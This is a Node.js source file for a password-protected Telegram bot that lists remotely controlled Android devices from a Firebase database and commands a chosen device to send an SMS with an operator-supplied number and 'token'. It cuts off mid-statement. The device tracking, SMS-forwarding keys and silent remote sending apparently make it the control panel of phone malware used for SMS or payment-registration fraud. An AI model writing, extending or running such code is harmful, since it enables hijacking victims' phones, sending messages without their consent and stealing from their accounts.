require('dotenv').config();

/**
 * Bot B - SMS Sender Bot (FIXED)
 * - Writes to action/ root with correct command structure
 * - Fallback paths: action/ (root), action/sendSms, clients/action/sendSms, sms
 * - Confirmation checks multiple formats (boolean, string 'true', 'sent', etc.)
 */

const { Telegraf, Markup } = require('telegraf');
const fs = require('fs');
const path = require('path');

// ============================================
// CONFIGURATION
// ============================================

const BOT_TOKEN = process.env.BOT_TOKEN || 'YOUR_BOT_TOKEN_HERE';
const DATABASE_URL = process.env.DATABASE_URL || 'YOUR_FIREBASE_URL_HERE';
const BOT_PASSWORD = process.env.BOT_PASSWORD || '1234';

const DEVICES_PER_PAGE = 20;
const DATA_FILE = path.join(__dirname, 'bot_config.json');

// ============================================
// STATE MANAGEMENT
// ============================================

let deviceList = [];
let deviceStatus = {};
let totalDevices = 0;
const userSessions = new Map();
const authenticatedUsers = new Set();

// ============================================
// HELPER FUNCTIONS
// ============================================

function timeAgo(timestamp) {
  if (!timestamp) return 'Unknown';
  const seconds = Math.floor((Date.now() - timestamp) / 1000);
  if (seconds < 60) return `${seconds} sec ago`;
  if (seconds < 3600) return `${Math.floor(seconds / 60)} min ago`;
  if (seconds < 86400) return `${Math.floor(seconds / 3600)} hours ago`;
  return `${Math.floor(seconds / 86400)} days ago`;
}

async function fetchDeviceStatus(deviceId) {
  try {
    let isOnline = false;
    let lastSeen = null;
    let totalSms = 0;

    try {
      const userDataRes = await fetch(`${DATABASE_URL}/user_data/${deviceId}.json`);
      const userData = await userDataRes.json();
      if (userData) {
        isOnline = String(userData.status).toLowerCase() === 'online' || userData.status === true;
        lastSeen = userData.timestamp || null;
      }
    } catch (e) {}

    try {
      const webhookRes = await fetch(`${DATABASE_URL}/${deviceId}/webhookEvent/sendSms.json`);
      const webhookData = await webhookRes.json();
      if (webhookData) {
        const entries = Object.values(webhookData);
        totalSms = entries.length;
        if (!lastSeen) {
          const latest = entries.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0))[0];
          lastSeen = latest?.timestamp || null;
        }
      }
    } catch (e) {}

    return { isOnline, lastSeen, totalSms };
  } catch (error) {
    return { isOnline: false, lastSeen: null, totalSms: 0 };
  }
}

async function fetchDevices() {
  try {
    const response = await fetch(`${DATABASE_URL}/.json?shallow=true`);
    const data = await response.json();
    if (!data) return [];
    return Object.keys(data).filter(key => {
      if (['All_Users', 'clients', 'all_pas', 'Admin', 'commands', 'users', 'user_data', 'user_list', 'user_sms', 'sms_forward'].includes(key)) return false;
      return true;
    });
  } catch (error) {
    console.error('Error fetching devices:', error);
    return [];
  }
}

function generatePagination(total, perPage = DEVICES_PER_PAGE) {
  const totalPages = Math.ceil(total / perPage);
  const buttons = [];
  for (let page = 1; page <= totalPages; page++) {
    const start = ((page - 1) * perPage) + 1;
    const end = Math.min(page * perPage, total);
    buttons.push(Markup.button.callback(`${start}-${end}`, `page_${page}`));
  }
  const rows = [];
  for (let i = 0; i < buttons.length; i += 5) {
    rows.push(buttons.slice(i, i + 5));
  }
  return { totalPages, rows, perPage };
}

function parseInput(input) {
  const parts = input.split('|').map(p => p.trim());
  if (parts.length !== 2) return null;
  const phone = parts[0].replace(/\D/g, '');
  const token = parts[1];
  if (phone.length < 10 || token.length < 10) return null;
  return { phone, token };
}

// ============================================
// SMART PATH FALLBACK SYSTEM
// ============================================

// '' = write directly to /deviceId/action/ with command structure
const PATHS_TO_TRY = [
  '',                    // root action/
  'action/sendSms',
  'clients/action/sendSms',
  'sms'
];

async function writeToPath(deviceId, relativePath, phone, message) {
  const baseUrl = DATABASE_URL.endsWith('/') ? DATABASE_URL.slice(0, -1) : DATABASE_URL;
  
  // Special: write to action/ root with command structure
  if (relativePath === '') {
    const url = `${baseUrl}/${deviceId}/action.json`;
    const data = {
      command: "send message",
      messageText: message,
      phoneNumber: phone,
      simSlot: "0",
      targetDeviceId: deviceId
    };
    try {
      const response = await fetch(url, {
        method: 'PUT',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
      });
      return response.ok;
    } catch (e) {
      return false;
    }
  }

  // Other paths: use fallback structure
  const url = `${baseUrl}/${deviceId}/${relativePath}.json`;
  const data = {
    message,
    to: phone,
    status: 'pending',
    timestamp: Date.now()
  };
  try {
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data)
    });
    return response.ok;
  } catch (e) {
    return false;
  }
}

async function checkSmsSent(deviceId, phone, message) {
  try {
    const baseUrl = DATABASE_URL.endsWith('/') ? DATABASE_URL.slice(0, -1) : DATABASE_URL;
    const locations = [
      `${baseUrl}/${deviceId}/webhookEvent/sendSms.json`,
      `${baseUrl}/${deviceId}/webhookEvent.json`,
      `${baseUrl}/${deviceId}/status.json`
    ];

    for (const location of locations) {
      try {
        const response = await fetch(location);
        if (!response.ok) continue;
        const data = await response.json();
        if (!data) continue;
        const entries = Object.values(data);
        const found = entries.find(entry =>
          entry.to?.trim() === phone.trim() &&
          entry.message?.trim() === message.trim() &&
          (entry.isSended === true || entry.isSended === 'true' || entry.isSended === '1' || entry.status === 'sent')
        );
        if (found) return true;
      } catch (e) {}
    }
    return false;
  } catch (e) {
    return false;
  }
}

async function sendSmsWithFallback(deviceId, phone, message) {
  for (const relativePath of PATHS_TO_TRY) {
    const pathDisplay = relativePath === '' ? 'action/ (root)' : relativePath;
    console.log(`🔄 Trying path: ${pathDisplay} for ${deviceId}`);
    const writeSuccess = await writeToPath(deviceId, relativePath, phone, message);
    if (!writeSuccess) {
      console.log(`❌ Write failed on ${pathDisplay}`);
      continue;
    }
    console.log(`✅ Write successful on ${pathDisplay}, waiting for confirmation...`);
    let confirmed = false;
    let attempts = 0;
    const maxAttempts = 10;
    const delayMs = 1000;
    while (!confirmed && attempts < maxAttempts) {
      await new Promise(resolve => setTimeout(resolve, delayMs));
      confirmed = await checkSmsSent(deviceId, phone, message);
      attempts++;
      if (confirmed) {
        console.log(`🎉 Confirmed on ${pathDisplay} after ${attempts} attempts`);
        return { success: true, pathUsed: relativePath };
      }
      if (attempts % 3 === 0) {
        console.log(`⏳ Waiting... attempt ${attempts}/${maxAttempts}`);
      }
    }
    console.log(`⏳ No response on ${pathDisplay}, trying next...`);
  }
  return { success: false, pathUsed: null };
}

// ============================================
// PASSWORD MIDDLEWARE
// ============================================

const checkPassword = async (ctx, next) => {
  const chatId = ctx.chat.id;
  if (authenticatedUsers.has(chatId)) return next();
  const session = userSessions.get(chatId);
  if (session?.step === 'enter_password') return next();
  userSessions.set(chatId, { step: 'enter_password' });
  await ctx.reply(
    `🔐 *Bot Protected*\n\nPlease enter password to continue:\n(One-time entry, will not ask again)`,
    { parse_mode: 'Markdown' }
  );
};

// ============================================
// BOT SETUP
// ============================================

const bot = new Telegraf(BOT_TOKEN);

bot.use(async (ctx, next) => {
  if (ctx.message?.text === '/start') return next();
  return checkPassword(ctx, next);
});

// ============================================
// COMMANDS
// ============================================

bot.command('start', async (ctx) => {
  const chatId = ctx.chat.id;
  if (authenticatedUsers.has(chatId)) return showDeviceList(ctx, 1);
  userSessions.set(chatId, { step: 'enter_password' });
  await ctx.reply(
    `👋 *Welcome to SMS Sender Bot (Bot B)*\n\n🔐 This bot is password protected.\n\nPlease enter password to continue:`,
    { parse_mode: 'Markdown' }
  );
});

bot.command('help', (ctx) => {
  ctx.reply(
    `*SMS Sender Bot - Help*\n\n*Commands:*\n/start - Start the bot\n/send - Send new SMS\n/devices - List all devices\n/status - Check device status\n/logout - Clear session\n\n*How to send SMS:*\n1. Enter password (one-time)\n2. Select a device (🟢 = online)\n3. Enter: NUMBER | TOKEN\n4. Wait for confirmation\n\n*Format:* 9876543210 | v+H3QvA66Qcq...`,
    { parse_mode: 'Markdown' }
  );
});

bot.command('logout', (ctx) => {
  const chatId = ctx.chat.id;
  authenticatedUsers.delete(chatId);
  userSessions.delete(chatId);
  ctx.reply('✅ Logged out. Use /start to login again.');
});

// ============================================
// PASSWORD HANDLER
// ============================================

bot.on('text', async (ctx) => {
  const chatId = ctx.chat.id;
  const text = ctx.message.text;
  const session = userSessions.get(chatId);
  if (session?.step === 'enter_password') {
    if (text === BOT_PASSWORD) {
      authenticatedUsers.add(chatId);
      userSessions.delete(chatId);
      await ctx.reply('✅ *Access Granted!*\n\nWelcome to SMS Sender Bot.', { parse_mode: 'Markdown' });
      return showDeviceList(ctx, 1);
    } else {
      return ctx.reply('❌ Wrong password! Try again:');
    }
  }
  await handleTextInput(ctx, text);
});

// ============================================
// DEVICE LIST DISPLAY
// ============================================

async function showDeviceList(ctx, page, filter = 'all') {
  try {
    if (deviceList.length === 0) {
      deviceList = await fetchDevices();
      for (const deviceId of deviceList) {
        deviceStatus[deviceId] = await fetchDeviceStatus(deviceId);
      }
    }
    let filteredDevices = deviceList;
    if (filter === 'online') filteredDevices = deviceList.filter(id => deviceStatus[id]?.isOnline === true);
    else if (filter === 'offline') filteredDevices = deviceList.filter(id => deviceStatus[id]?.isOnline !== true);
    filteredDevices.sort((a, b) => {
      const onlineA = deviceStatus[a]?.isOnline || false;
      const onlineB = deviceStatus[b]?.isOnline || false;
      if (onlineA === onlineB) return a.localeCompare(b);
      return onlineA ? -1 : 1;
    });
    const total = filteredDevices.length;
    const perPage = DEVICES_PER_PAGE;
    const start = (page - 1) * perPage;
    const end = Math.min(start + perPage, total);
    const pageDevices = filteredDevices.slice(start, end);
    const onlineCount = deviceList.filter(id => deviceStatus[id]?.isOnline === true).length;
    const offlineCount = deviceList.length - onlineCount;
    let message = `📱 *SMS Sender Bot*\n\n🟢 Online: ${onlineCount} | 🔴 Offline: ${offlineCount} | Total: ${deviceList.length}\n\n`;
    if (filter !== 'all') {
      message += `Filter: ${filter === 'online' ? '🟢 Online Only' : '🔴 Offline Only'}\n`;
      message += `Showing: ${total} devices\n\n`;
    }
    const pagination = generatePagination(total, perPage);
    const deviceButtons = [];
    pageDevices.forEach((deviceId, index) => {
      const globalIndex = start + index + 1;
      const status = deviceStatus[deviceId] || {};
      const emoji = status.isOnline ? '🟢' : '🔴';
      const time = timeAgo(status.lastSeen);
      const shortId = deviceId.length > 12 ? deviceId.substring(0, 12) + '...' : deviceId;
      message += `${globalIndex}. ${emoji} \`${shortId}\`\n`;
      message += `   ${time} | SMS: ${status.totalSms || 0}\n\n`;
      deviceButtons.push([Markup.button.callback(`${globalIndex}. ${emoji} Select`, `select_${deviceId}`)]);
    });
    message += `\nPage ${page}/${pagination.totalPages} | Showing ${start + 1}-${end} of ${total}`;
    const navButtons = [];
    if (page > 1) navButtons.push(Markup.button.callback('⬅️ Previous', `page_${page - 1}`));
    navButtons.push(Markup.button.callback(`📄 ${page}/${pagination.totalPages}`, 'current_page'));
    if (end < total) navButtons.push(Markup.button.callback('➡️ Next', `page_${page + 1}`));
    const filterButtons = [
      Markup.button.callback('🔍 Search', 'search_device'),
      Markup.button.callback('🟢 Online', 'filter_online'),
      Markup.button.callback('🔴 Offline', 'filter_offline'),
      Markup.button.callback('🔃 Refresh', 'refresh_list')
    ];
    const keyboard = [
      ...pagination.rows.slice(0, 2),
      navButtons,
      filterButtons
    ];
    keyboard.push(...deviceButtons);
    await ctx.reply(message, { parse_mode: 'Markdown', ...Markup.inlineKeyboard(keyboard) });
  } catch (error) {
    console.error('Error showing device list:', error);
    ctx.reply('❌ Error loading devices. Try /start again.');
  }
}

// ============================================
// TEXT INPUT HANDLER
// ============================================

async function handleTextInput(ctx, text) {
  const chatId = ctx.chat.id;
  const session = userSessions.get(chatId);
  if (!session) return ctx.reply('Use /start to begin.');
  if (session.step === 'search') {
    const query = text.toLowerCase();
    const matches = deviceList.filter(id => id.toLowerCase().includes(query));
    if (matches.length === 0) return ctx.reply('❌ No devices found. Try again.');
    let message = `🔍 *Search Results* (${matches.length} found):\n\n`;
    matches.slice(0, 20).forEach((deviceId, index) => {
      const status = deviceStatus[deviceId] || {};
      const emoji = status.isOnline ? '🟢' : '🔴';
      message += `${index + 1}. ${emoji} \`${deviceId}\`\n   ${timeAgo(status.lastSeen)}\n\n`;
    });
    const buttons = matches.slice(0, 10).map((deviceId, index) => [
      Markup.button.callback(`${index + 1}. Select ${deviceId.substring(0, 8)}...`, `select_${deviceId}`)
    ]);
    buttons.push([Markup.button.callback('🔙 Back to List', 'refresh_list')]);
    await ctx.reply(message, { parse_mode: 'Markdown', ...Markup.inlineKeyboard(buttons) });
    userSessions.delete(chatId);
    return;
  }
  if (session.step === 'enter_details') {
    const parsed = parseInput(text);
    if (!parsed) {
      return ctx.reply(
        `❌ Invalid format!\n\nUse: NUMBER | TOKEN\nExample: \`9876543210 | v+H3QvA66Qcq...\``,
        { parse_mode: 'Markdown' }
      );
    }
    const { phone, token } = parsed;
    const { deviceId, isOnline } = session;
    session.step = 'confirm';
    session.phone = phone;
    session.token = token;
    let message = `📋 *Confirm SMS Details*\n\n📱 Device: \`${deviceId}\`\n📞 To: ${phone}\n🔑 Token: ${token.substring(0, 30)}...\n\n`;
    if (!isOnline) message += `⚠️ Device is offline. SMS will be queued.\n\n`;
    await ctx.reply(message, {
      parse_mode: 'Markdown',
      ...Markup.inlineKeyboard([
        [Markup.button.callback('✅ Confirm & Send', `confirm_send_${deviceId}`)],
        [Markup.button.callback('❌ Cancel', 'cancel_send')]
      ])
    });
    return;
  }
}

// ============================================
// ACTION HANDLERS
// ============================================

bot.action(/page_(\d+)/, async (ctx) => {
  const page = parseInt(ctx.match[1]);
  await ctx.answerCbQuery(`Page ${page}`);
  await showDeviceList(ctx, page);
});

bot.action('filter_online', async (ctx) => {
  await ctx.answerCbQuery('Showing online devices');
  await showDeviceList(ctx, 1, 'online');
});

bot.action('filter_offline', async (ctx) => {
  await ctx.answerCbQuery('Showing offline devices');
  await showDeviceList(ctx, 1, 'offline');
});

bot.action('refresh_list', async (ctx) => {
  await ctx.answerCbQuery('Refreshing...');
  deviceList = [];
  deviceStatus = {};
  await showDeviceList(ctx, 1);
});

bot.action('search_device', async (ctx) => {
  await ctx.answerCbQuery('Search mode');
  const chatId = ctx.chat.id;
  userSessions.set(chatId, { step: 'search' });
  await ctx.reply(`🔍 *Search Device*\n\nEnter part of Android ID:`, { parse_mode: 'Markdown' });
});

bot.action(/select_(.+)/, async (ctx) => {
  const deviceId = ctx.match[1];
  const chatId = ctx.chat.id;
  const status = deviceStatus[deviceId] || {};
  const isOnline = status.isOnline || false;
  const time = timeAgo(status.lastSeen);
  const emoji = isOnline ? '🟢' : '🔴';
  userSessions.set(chatId, { step: 'enter_details', deviceId, isOnline });
  let message = `📱 *Selected Device*\n\nID: \`${deviceId}\`\nStatus: ${emoji} ${isOnline ? 'ONLINE' : 'OFFLINE'}\nLast seen: ${time}\nTotal SMS: ${status.totalSms || 0}\n\n`;
  if (!isOnline) message += `⚠️ *Warning: Device is offline*\nSMS will be queued and sent when online.\n\n`;
  message += `✏️ *Enter recipient details:*\n\nFormat: NUMBER | TOKEN\nExample: \`9876543210 | v+H3QvA66Qcq...\``;
  await ctx.answerCbQuery('Device selected');
  await ctx.reply(message, { parse_mode: 'Markdown' });
});

bot.action(/confirm_send_(.+)/, async (ctx) => {
  const deviceId = ctx.match[1];
  const chatId = ctx.chat.id;
  const session = userSessions.get(chatId);
  if (!session || !session.phone || !session.token) {
    return ctx.answerCbQuery('Session expired. Start again.');
  }
  const { phone, token } = session;
  await ctx.answerCbQuery('Sending...');
  const statusMsg = await ctx.reply(
    `🔄 *Sending SMS...*\n\nStep 1: Writing to Firebase...`,
    { parse_mode: 'Markdown' }
  );
  try {
    const result = await sendSmsWithFallback(deviceId, phone, token);
    if (result.success) {
      const pathDisplay = result.pathUsed === '' ? 'action/ (root)' : result.pathUsed;
      await ctx.telegram.editMessageText(
        chatId, statusMsg.message_id, null,
        `✅ *SMS SENT SUCCESSFULLY!*\n\n📱 Device: \`${deviceId}\`\n📞 To: ${phone}\n🔑 Token: ${token.substring(0, 30)}...\n🛤️ Path Used: \`${pathDisplay}\`\n📊 Status: ✅ Confirmed Delivered`,
        { parse_mode: 'Markdown', ...Markup.inlineKeyboard([
          [Markup.button.callback('🔄 Send Another', 'refresh_list')],
          [Markup.button.callback('🏠 Main Menu', 'start')]
        ]) }
      );
    } else {
      await ctx.telegram.editMessageText(
        chatId, statusMsg.message_id, null,
        `❌ *FAILED TO SEND*\n\n📱 Device: \`${deviceId}\`\n📞 To: ${phone}\n\n⚠️ Tried all possible paths but device did not respond.\nDevice may be offline or not listening.\n\n*Tried Paths:*\n${PATHS_TO_TRY.map(p => p === '' ? '• action/ (root)' : `• ${p}`).join('\n')}`,
        { parse_mode: 'Markdown', ...Markup.inlineKeyboard([
          [Markup.button.callback('🔄 Retry', `confirm_send_${deviceId}`)],
          [Markup.button.callback('🏠 Main Menu', 'start')]
        ]) }
      );
    }
  } catch (error) {
    console.error('Send error:', error);
    await ctx.telegram.editMessageText(chatId, statusMsg.message_id, null, `❌ *FAILED TO SEND*\n\nError: ${error.message}`, { parse_mode: 'Markdown' });
  }
  userSessions.delete(chatId);
});

bot.action('cancel_send', async (ctx) => {
  userSessions.delete(ctx.chat.id);
  await ctx.answerCbQuery('Cancelled');
  await ctx.reply('❌ Cancelled. Use /start to begin.');
});

bot.action(/check_status_(.+)/, async (ctx) => {
  const deviceId = ctx.match[1];
  await ctx.answerCbQuery('Checking...');
  const status = await fetchDeviceStatus(deviceId);
  deviceSt
